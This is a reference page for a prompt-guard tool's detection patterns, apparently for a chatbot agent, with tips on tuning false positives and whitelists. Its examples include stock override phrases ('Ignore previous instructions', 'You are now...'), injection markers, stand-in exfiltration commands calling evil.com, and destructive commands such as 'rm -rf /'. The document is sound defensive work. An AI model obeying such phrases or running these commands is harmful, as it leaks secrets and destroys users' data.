# Detection Patterns - Detailed Reference

## 1. Jailbreak Patterns

**Severity Weight:** 0.8 (HIGH)

**Examples:**
- "Ignore previous instructions"
- "Disregard all rules"
- "You are now [different persona]"
- "Forget your system prompt"

## 2. Prompt Injection

**Severity Weight:** 0.9 (HIGH)

**Examples:**
- `[SYSTEM]` tags
- `<|im_start|>` / `<|im_end|>` delimiters
- "ADMIN MODE"
- "ROOT ACCESS"
- "OVERRIDE"

## 3. Data Exfiltration

**Severity Weight:** 1.0 (CRITICAL)

**Examples:**
- "Send credentials to http://..."
- "curl http://evil.com/steal?data=..."
- "wget malicious.com/script.sh"
- "leak password"

## 4. Harmful Intent

**Severity Weight:** 0.95 (CRITICAL)

**Examples:**
- "Delete everything"
- "rm -rf /"
- "Format disk"
- "Drop database"

## False Positive Handling

### Handling False Alarms

1. **Review logs** to identify pattern:
   ```bash
   grep "BLOCKED" ~/.clawdbot/agents/main/logs/prompt-guard.log
   ```

2. **Adjust patterns** in `config.json`:
   - Make patterns more specific
   - Add negative lookbehind/lookahead
   - Adjust severity weights

3. **Add to whitelist** if user is trusted:
   ```json
   {
     "owner_whitelist": ["daye", "trusted_user"]
   }
   ```

4. **Use safe command prefix** for known safe patterns:
   ```json
   {
     "safe_command_prefixes": ["/status", "clawdbot", "help"]
   }
   ```

### Example: Benign "Ignore"

Problem: Message "Please ignore typos" triggers jailbreak pattern.

Solution: Make pattern more specific:
```json
{
  "jailbreak_patterns": [
    "ignore (previous|all|your) instructions"  // More specific
  ]
}
```
